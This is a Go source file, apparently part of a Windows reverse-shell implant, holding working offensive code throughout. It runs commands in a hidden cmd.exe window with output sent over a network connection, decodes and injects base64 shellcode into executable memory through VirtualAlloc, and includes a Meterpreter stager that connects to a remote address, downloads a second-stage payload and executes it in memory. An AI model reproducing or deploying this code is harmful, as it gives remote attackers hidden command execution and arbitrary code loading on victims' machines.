// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"encoding/binary"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	// Resolve VirtualAlloc
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i := 0; i < len(shellcode); i++ {
		addrPtr[i] = shellcode[i]
	}
	go syscall.Syscall(address, 0, 0, 0, 0)
}

func Meterpreter(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		stage2LengthInt uint32
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}
	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	if _, err = conn.Read(stage2Buf); err != nil {
		return false, err
	}

	ExecShellcode(stage2Buf)

	return true, nil
}
